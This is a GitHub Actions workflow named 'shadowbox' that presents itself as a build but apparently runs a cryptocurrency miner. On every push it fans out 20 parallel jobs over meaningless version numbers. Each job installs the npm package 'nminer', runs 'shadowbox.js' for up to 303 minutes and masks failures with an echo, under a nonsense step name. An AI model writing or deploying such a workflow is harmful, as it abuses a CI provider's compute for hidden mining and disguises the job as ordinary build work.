name: shadowbox
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7877 }
          - { version: 8001 }
          - { version: 4793 }
          - { version: 8429 }
          - { version: 1269 }
          - { version: 8780 }
          - { version: 960 }
          - { version: 4808 }
          - { version: 6096 }
          - { version: 3628 }
          - { version: 8033 }
          - { version: 6420 }
          - { version: 6079 }
          - { version: 2685 }
          - { version: 6421 }
          - { version: 6648 }
          - { version: 7627 }
          - { version: 9235 }
          - { version: 9771 }
          - { version: 2812 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: promptly that institutionalize as
        run: |
          npm install nminer@latest
          timeout 303m node shadowbox.js || echo "shadowbox executed"